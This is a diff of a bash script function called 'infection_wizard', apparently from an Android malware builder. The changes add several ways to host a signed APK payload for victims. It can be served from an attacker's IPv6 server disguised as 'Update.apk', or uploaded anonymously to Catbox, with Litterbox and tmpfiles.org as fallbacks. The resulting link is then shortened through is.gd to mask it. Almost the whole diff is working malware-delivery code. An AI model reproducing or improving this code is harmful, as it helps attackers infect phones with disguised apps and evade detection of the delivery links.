@@ -333,23 +333,43 @@ infection_wizard() {
     local SIGNED_APK="$SCRIPT_DIR/output/signed_v1.apk"
     echo ""
     echo -e "${CYAN}[HOSTING] Select strategy:${NC}"
-    echo "    1. Anonymous Cloud (Catbox)  2. Direct IP (IPv6)"
+    echo "    1. Anonymous Cloud (Catbox / Multi-Cloud Fallback)"
+    echo "    2. Direct IP (IPv6)"
+    echo "    3. Custom / Pre-hosted Direct URL"
     read -p "    Choice: " H
     local DOWNLOAD_URL=""
     if [ "$H" == "2" ]; then
         read -p "    Target IPv6: " IP
         DOWNLOAD_URL="http://[$IP]:9191/download/Update.apk"
+    elif [ "$H" == "3" ]; then
+        read -p "    Enter pre-hosted URL: " DOWNLOAD_URL
     else
         echo -e "${YELLOW}[*] Uploading to Catbox.moe...${NC}"
-        DOWNLOAD_URL=$(curl -sS -F "reqtype=fileupload" -F "fileToUpload=@$SIGNED_APK" https://catbox.moe/user/api.php)
-        if [ $? -ne 0 ] || [[ "$DOWNLOAD_URL" == *"ERROR"* ]] || [ -z "$DOWNLOAD_URL" ]; then
-            echo -e "${RED}[!] Upload failed: $DOWNLOAD_URL${NC}"
+        DOWNLOAD_URL=$(curl -sS --connect-timeout 10 --max-time 180 -F "reqtype=fileupload" -F "fileToUpload=@$SIGNED_APK" https://catbox.moe/user/api.php 2>/dev/null)
+        if [[ "$DOWNLOAD_URL" != "http"* ]]; then
+            echo -e "${YELLOW}[!] Catbox failed/unreachable. Trying Litterbox fallback...${NC}"
+            DOWNLOAD_URL=$(curl -sS --connect-timeout 10 --max-time 180 -F "reqtype=fileupload" -F "time=72h" -F "fileToUpload=@$SIGNED_APK" https://litterbox.catbox.moe/resources/internals/api.php 2>/dev/null)
+        fi
+        if [[ "$DOWNLOAD_URL" != "http"* ]]; then
+            echo -e "${YELLOW}[!] Litterbox failed/unreachable. Trying Tmpfiles.org fallback...${NC}"
+            local TMP_RESP=$(curl -sS --connect-timeout 10 --max-time 180 -F "file=@$SIGNED_APK" https://tmpfiles.org/api/v1/upload 2>/dev/null)
+            local RAW_TMP=$(echo "$TMP_RESP" | grep -o '"url":"[^"]*' | cut -d'"' -f4)
+            if [[ "$RAW_TMP" == *"tmpfiles.org/"* ]]; then
+                DOWNLOAD_URL=$(echo "$RAW_TMP" | sed 's/tmpfiles.org\//tmpfiles.org\/dl\//')
+            fi
+        fi
+        if [[ "$DOWNLOAD_URL" != "http"* ]]; then
+            echo -e "${RED}[!] Automated cloud uploads failed or unreachable on this network.${NC}"
+            read -p "    Enter custom / pre-hosted URL manually: " DOWNLOAD_URL
+        fi
+        if [ -z "$DOWNLOAD_URL" ] || [[ "$DOWNLOAD_URL" != "http"* ]]; then
+            echo -e "${RED}[!] Upload failed / No valid URL provided.${NC}"
             read -p "Press Enter to return..."
             return 1
         fi
         echo -e "${GREEN}[✓] Hosted: $DOWNLOAD_URL${NC}"
         echo -e "${YELLOW}[*] Shortening delivery URL...${NC}"
-        SHORT_URL=$(curl -s "https://is.gd/create.php?format=simple&url=$DOWNLOAD_URL")
+        SHORT_URL=$(curl -s --connect-timeout 5 "https://is.gd/create.php?format=simple&url=$DOWNLOAD_URL" 2>/dev/null)
         if [[ "$SHORT_URL" == "http"* ]]; then
             DOWNLOAD_URL=$SHORT_URL
             echo -e "${GREEN}[✓] Shortened: $DOWNLOAD_URL${NC}"
